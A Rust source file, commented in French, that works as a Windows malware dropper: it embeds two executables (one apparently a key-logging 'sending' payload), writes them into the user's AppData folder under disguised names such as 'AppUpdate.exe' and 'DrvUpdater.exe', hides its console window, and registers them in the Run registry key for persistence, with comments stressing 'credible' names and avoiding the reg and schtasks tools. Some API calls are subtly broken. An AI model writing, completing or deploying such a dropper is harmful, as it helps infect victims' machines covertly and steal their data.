use std::env;
use std::fs;
use std::path::{Path, PathBuf};
use std::io::{self, Write};
use winapi::um::winuser::{GetDesktopWindow, GetWindowThreadProcessId};
use winapi::um::winnt::{PROCESS_QUERY_INFORMATION, PROCESS_VM_READ};
use std::ptr;
use std::ffi::CString;
use std::os::windows::ffi::OsStrExt;

#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

extern crate winapi;

fn install_payload(filename: &str, payload_data: &[u8]) -> PathBuf {
    // Obtenez le dossier AppData de l'utilisateur
    let app_data = env::var("APPDATA").expect("Impossible de trouver APPDATA");
    let install_dir = PathBuf::from(app_data).join("MyAppService");

    if !install_dir.exists() {
        fs::create_dir_all(&install_dir).unwrap();
    }

    let full_path = install_dir.join(filename);
    println!("Copie vers : {}", full_path.display());
    fs::write(&full_path, payload_data).expect("Erreur lors de la copie du payload");

    full_path
}

fn add_to_registry(executable_path: &Path) {
    // Utilisation de l'API Windows pour manipuler le registre au lieu de "reg" ou "schtasks"
    use winapi::um::winreg::{RegOpenKeyExW, RegSetValueExW, HKEY_CURRENT_USER};
    use winapi::um::winnt::{KEY_WRITE, REG_SZ};
    use std::ptr::null_mut;
    use std::os::windows::ffi::OsStrExt;
    
    let key_path = r"Software\Microsoft\Windows\CurrentVersion\Run";
    let program_name = "MyAppService"; // Nom crédible de votre programme

    let hkey = HKEY_CURRENT_USER;
    let mut registry_key = null_mut();
    let path = executable_path.to_string_lossy();

    // Ouvrir la clé du registre
    unsafe {
        let key_name = CString::new(key_path).unwrap();
        let result = RegOpenKeyExW(
            hkey,
            key_name.as_ptr() as *const u16,
            0,
            KEY_WRITE,
            &mut registry_key,
        );
        if result != 0 {
            println!("Erreur lors de l'ouverture de la clé du registre.");
            return;
        }

        // Ajouter la valeur au registre
        let value_name = CString::new(program_name).unwrap();
        let value = CString::new(path.as_ref()).unwrap();

        let result = RegSetValueExW(
            registry_key,
            value_name.as_ptr() as *const u16,
            0,
            REG_SZ,
            value.as_ptr() as *const u8,
            value.to_bytes().len() as u32,
        );
        if result != 0 {
            println!("Erreur lors de l'ajout de la valeur au registre.");
        }
    }
}

fn main() {
    let payload_filename = "AppUpdate.exe";  // Nom crédible pour l'exécutable
    let payload_data = include_bytes!("/workspaces/keys/target/x86_64-pc-windows-gnu/release/sending.exe");

    // Installe le payload dans AppData
    let path_payload = install_payload(payload_filename, payload_data);

    add_to_registry(&path_payload);

    let payload_filename1 = "DrvUpdater.exe";  // Nom crédible pour l'exécutable
    let payload_data1 = include_bytes!("/workspaces/keys/Update/src/assets/WinDrvUpdater.exe");

    // Installe le payload dans AppData
    let path_payload1 = install_payload(payload_filename1, payload_data1);

    // Ajoute l'exécutable au registre pour démarrer au démarrage
    add_to_registry(&path_payload1);

    println!("Installation terminée et ajout au démarrage réussi.");
}
